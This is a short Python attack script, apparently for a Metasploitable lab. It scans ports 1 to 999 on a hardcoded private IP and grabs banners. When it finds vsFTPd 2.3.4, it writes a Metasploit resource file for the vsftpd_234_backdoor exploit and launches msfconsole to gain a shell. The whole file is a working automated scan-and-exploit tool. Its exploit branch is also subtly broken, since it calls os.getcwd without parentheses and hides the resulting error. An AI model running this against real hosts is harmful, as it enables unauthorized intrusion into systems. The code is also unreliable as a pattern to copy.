import socket
import time
import threading
from termcolor import colored
import os
import subprocess

"""
@author Arturo Negreiros (Payload)
@description Software for connect to metasploitable machine, implementing reverse shell
"""


define_host = None
backdoor_service_SSH = ""
backdoor_service_VSFTPD = ""


def global_variables():
    global define_host
    global backdoor_service_SSH
    global backdoor_service_VSFTPD
    define_host = "192.168.100.209"  # defined host metasploit virtual machine
    backdoor_service_SSH = "SSH-2.0-OpenSSH_4.7p1"
    backdoor_service_VSFTPD = "vsFTPd 2.3.4"


global_variables()


def main(host, port):

    try:
        socket_connection = socket.socket()  # defined socket connection object
        socket_connection.connect((str(host), int(port)))
        banner = socket_connection.recv(1024)
        port_info = colored("[*] {port} open".format(port=port), "green")
        banner = str(banner).replace("b'", "")
        print(port_info + "\t"+banner)

        if backdoor_service_VSFTPD in str(banner):

            exploit = """
					use exploit/unix/ftp/vsftpd_234_backdoor
					set RHOSTS host
					exploit
				     """
            exploit = str(exploit).replace("host", host)
            path_saved = os.getcwd()
            os.chdir(os.getcwd+"/exploitfiles")
            file = open("vsftpd.rc", "w")
            file.write(exploit)
            file.close()
            command = "xterm -e msfconsole -r vsftpd.rc"
            subprocess.Popen(command, shell= True, stdout=subprocess.PIPE)
            os.chdir(path_saved)
        
        else:
            pass

    except Exception as e:
        # print(str(e))
        pass


if __name__ == '__main__':

    for x in range(1, 1000):

        main(define_host, x)
